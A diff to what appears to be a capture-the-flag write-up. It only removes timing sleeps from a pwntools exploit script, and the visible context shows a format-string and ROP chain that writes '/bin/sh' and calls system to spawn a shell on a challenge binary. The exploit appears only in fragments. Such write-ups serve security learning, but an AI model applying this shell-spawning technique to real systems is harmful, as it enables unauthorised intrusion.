@@ -32,7 +32,6 @@ Anyway, `%p` `%u` `%d` and `%x` is filtered but we can still use `%s` and `%o` t
 #!/usr/bin/env python3
 
 from pwn import *
-import time
 
 context.arch = 'amd64'
 '''
@@ -107,7 +106,6 @@ payload += p16(pop_rdi2)
 p.recvuntil(b">> ")
 p.sendline(b"2")
 p.recvuntil(b">> ")
-time.sleep(0.01)
 p.sendline(payload)
 
 # copy the next 2 bytes 
@@ -119,7 +117,6 @@ payload += p16(pop_rdi3)
 p.recvuntil(b">> ")
 p.sendline(b"2")
 p.recvuntil(b">> ")
-time.sleep(0.01)
 p.sendline(payload)
 
 # overwrite ret_addr+8 of main with "/bin/sh"
@@ -137,7 +134,6 @@ payload += p32(bin_sh1)
 p.recvuntil(b">> ")
 p.sendline(b"2")
 p.recvuntil(b">> ")
-time.sleep(0.1)
 p.sendline(payload)
 
 # copy the higher 4 bytes
@@ -151,7 +147,6 @@ payload += p32(bin_sh2)
 p.recvuntil(b">> ")
 p.sendline(b"2")
 p.recvuntil(b">> ")
-time.sleep(0.1)
 p.sendline(payload)
 
 # align the stack with "ret"
@@ -167,7 +162,6 @@ payload += p32(ret1)
 p.recvuntil(b">> ")
 p.sendline(b"2")
 p.recvuntil(b">> ")
-time.sleep(0.1)
 p.sendline(payload)
 
 # copy the higher 4 bytes
@@ -181,7 +175,6 @@ payload += p32(ret2)
 p.recvuntil(b">> ")
 p.sendline(b"2")
 p.recvuntil(b">> ")
-time.sleep(0.1)
 p.sendline(payload)
 
 # call system
@@ -197,7 +190,6 @@ payload += p32(system1)
 p.recvuntil(b">> ")
 p.sendline(b"2")
 p.recvuntil(b">> ")
-time.sleep(0.1)
 p.sendline(payload)
 
 # copy the higher 4 bytes
@@ -211,7 +203,6 @@ payload += p32(system1)
 p.recvuntil(b">> ")
 p.sendline(b"2")
 p.recvuntil(b">> ")
-time.sleep(0.1)
 p.sendline(payload)
 
 print("shell in 3...")
